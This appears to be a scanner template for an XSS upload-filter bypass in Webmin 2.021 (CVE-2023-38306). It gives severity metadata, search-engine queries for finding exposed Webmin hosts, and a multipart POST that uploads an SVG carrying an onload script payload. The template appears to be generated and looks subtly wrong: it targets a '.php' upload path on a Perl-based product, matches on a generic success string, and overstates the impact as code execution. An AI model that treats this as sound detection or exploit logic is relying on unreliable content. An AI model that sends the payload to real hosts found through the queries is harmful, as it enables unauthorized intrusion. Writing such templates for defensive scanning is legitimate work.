id: CVE-2023-38306

info:
  name: Webmin 2.021 XSS Bypass in File Upload
  author: ProjectDiscoveryAI
  severity: medium
  description: An issue was discovered in Webmin 2.021. A Cross-site Scripting (XSS) Bypass vulnerability was discovered in the file upload functionality. Normally, the application restricts the upload of certain file types such as .svg, .php, etc., and displays an error message if a prohibited file type is detected. However, by following certain steps, an attacker can bypass these restrictions and inject malicious code.
  impact: |
    Successful exploitation could lead to arbitrary code execution or sensitive information disclosure.
  remediation: |
    Update Webmin to version 2.022 or later to mitigate the vulnerability.
  reference:
    - https://webmin.com/tags/webmin-changelog/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2023-38306
    cwe-id: CWE-79
    epss-score: 0.00075
    epss-percentile: 0.34153
    cpe: cpe:2.3:a:webmin:webmin:2.021:*:*:*:*:*:*:*
  metadata:
    vendor: webmin
    product: webmin
    shodan-query: title:"Webmin"
    fofa-query: title="webmin"
    google-query: intitle:"webmin"

http:
  - method: POST
    path:
      - "{{BaseURL}}/file_upload.php"

    body: |
      ------WebKitFormBoundaryePkpFF7tjBAqx29L
      Content-Disposition: form-data; name="file"; filename="test.svg"
      Content-Type: image/svg+xml

      <svg/onload=alert(1)>
      ------WebKitFormBoundaryePkpFF7tjBAqx29L--

    headers:
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryePkpFF7tjBAqx29L
    matchers:
      - type: word
        words:
          - "File uploaded successfully"
        part: body
